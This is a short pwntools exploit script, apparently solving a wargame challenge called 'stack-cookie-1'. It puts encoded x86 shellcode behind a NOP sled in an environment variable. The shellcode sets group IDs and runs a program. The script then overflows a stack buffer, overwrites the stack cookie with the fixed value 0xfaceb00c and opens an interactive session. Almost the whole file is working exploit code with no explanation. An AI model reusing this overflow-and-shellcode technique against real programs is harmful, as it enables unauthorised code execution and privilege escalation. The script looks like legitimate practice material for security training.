
#!/usr/bin/env python

from pwn import *
import os
#context.terminal = ['tmux', 'splitw', '-h']

env = {'SHELLCODE' : '\x90' * 50 + '\xb83\x01\x01\x01-\x01\x01\x01\x01\xcd\x80\x89\xc3\x89\xc1\xb8H\x01\x01\x01-\x01\x01\x01\x01\xcd\x801\xc9QjA\x89\xe31\xd2\xb8\x0c\x01\x01\x01-\x01\x01\x01\x01\xcd\x80'}

#[ret]
#[ebp]
#[ebp-4]
#
#...
#
#[ebp-88]

p = process('stack-cookie-1', env=env)
#gdb.attach(p, 'b*main')

p.sendline("A" * (0x84) + p32(0xfaceb00c) + "B" * 1000)
p.interactive()
